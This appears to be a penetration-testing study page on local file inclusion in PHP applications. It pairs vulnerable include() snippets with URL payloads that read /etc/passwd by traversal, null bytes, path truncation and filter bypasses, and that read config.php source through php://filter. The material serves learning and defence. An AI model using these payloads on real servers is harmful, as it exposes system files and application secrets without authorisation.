---
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# File Disclosure

{% hint style="info" %}
Manipulating HTTP parameters to display the content of any local file on the hosting server.
{% endhint %}

Two types of file disclosure:

1. [**LFI**](#user-content-fn-1)[^1] -> the file chosen to be included is local on the target machine
2. [**RFI**](#user-content-fn-2)[^2] -> the file is included on other machines

The common place we usually find LFI within is **template engines**. These keep the static parts of the web application the same when navigating between different pages. For example, `/index.php?page=about'`:

* `/index.php` sets the static content
* `?page=about` pulls the dynamic content, e.g. `about.php`

## Basic LFI

Using **absolute path**.

```php
# The whole input is used
include($_GET['language']);
```

```html
<!-- Basic LFI -->
/index.php?language=/etc/passwd
```

## Path Traversal

Using **relative path.**

```php
# String appended/prepended to the parameter
include("./languages/" . $_GET['language']);
```

```html
<!-- Path traversal -->
/index.php?language=../../../../../../etc/passwd
```

{% hint style="info" %}
**Default on using Path Traversal** -> works in both cases. \
If unsure for the `pwd` **keep adding `../`** -> does not break the path.
{% endhint %}

## Filename Prefix

Using `/../` (_the directory may not exist and may break some FI techniques, such as PHP wrappers/filters_).

```php
# Input appended after another string
include("lang_" . $_GET['language']);
```

```html
<!-- Bypassing prefix -->
/index.php?language=/../../../etc/passwd
```

## Appended Extensions

```php
# Extension appended to the target parameter
include($_GET['language'] . ".php");
```

### Path Truncation (ealier PHP versions)

* Max strings length is `4096` chars -> everything longer is truncated.
* Trailing `/` and `.` in path names are truncated (`/etc/passwd/.` -> `/etc/passwd`).
* Both PHP and Linux disregard multiple `/` in the path ( `////etc/passwd` =`/etc/passwd`).
* Similarly, a current directory shortcut (`.`) in the middle of the path would also be disregarded.

Based on the those characteristics, we can create very long strings that evaluate to the target path.

{% hint style="warning" %}
For this technique to work, we need to **start the path with a non-existing directory**.
{% endhint %}

{% code overflow="wrap" %}
```html
<!-- Creating a string longer than 4096 chars -->
?language=non_existing_directory/../../../etc/passwd/./././.[./ REPEATED ~2048 times]
```
{% endcode %}

{% code overflow="wrap" %}
```bash
# Creating the above with bash
echo -n "non_existing_directory/../../../etc/passwd/" && for i in {1..2048}; do echo -n "./"; done non_existing_directory/../../../etc/passwd/./././././././
```
{% endcode %}

### Null Byte (PHP < 5.3.4)

Appended extensions can be also bypassed with the use of a **null byte** (`%00` or `0x00`).

```html
<!-- Commenting out the extension -->
/index.php?language=/../../../etc/passwd%00
```

## Path Traversal Filters

### Search and Replace

One of the most common defences against LFI -> deletes substrings of `../,` e.g. `../../../etc/passwd` -> `.languages/etc/passwd`.

```php
# Search and replace method
$language = str_replace('../', '', $_GET['language']);
```

If **non-recursive**, i.e., runs just a single time on the input string -> double up the `../` (or `..././`, `..../`, `....////`, etc).&#x20;

```html
<!-- Bypassing a non-recursive search and replace filter -->
/index.php?language=....//....//....//etc/passwd
```

### Character Filters

If `.` and/or `/` are banned -> URL-encode once or twice.

## Approved Paths

Regex usage to ensure that the file being included is under a defined directory -> include the directory within the payload.

{% code overflow="wrap" %}
```php
# Using regex to "lock" down the directory
if(preg_match('/^\.\/languages\/.+$/', $_GET['language'])) { include($_GET['language']); } else { echo 'Illegal path specified!'; }
```
{% endcode %}

```html
<!-- Bypassing regex filters -->
/index.php?language=./languages/../../../etc/passwd
```

## PHP Filters

Read the source code of PHP files.

```html
<!-- Exfiltrating the source code of the config.php file -->
/index.php?language=php://filter/read=convert.base64-encode/resource=config.php
```

For an example of this check [StreamIO](../../../../boxes/boxes/medium/streamio.md#local-file-inclusion).

## Second-Order Attacks

Poison a database entry, so another web application functionality gets tricked or our registration name. This type of attack is often overlooked by the developers, as values pulled from the application's database is generally trusted, i.e., not sanitized.

1. Option to download our avatar via `/profile/$username/avatar.png`.
2. Craft a malicious LFI username, such as `../../../etc/passwd`.

## Resources

{% tabs %}
{% tab title="HTB" %}
{% embed url="https://academy.hackthebox.com/module/details/23" %}
{% endtab %}

{% tab title="PostSwigger" %}
{% embed url="https://portswigger.net/web-security/file-path-traversal" %}
{% endtab %}

{% tab title="THM" %}
{% embed url="https://tryhackme.com/jr/fileinc" %}
{% endtab %}
{% endtabs %}

as

[^1]: Local File Inclusion

[^2]: Remote File Inclusion
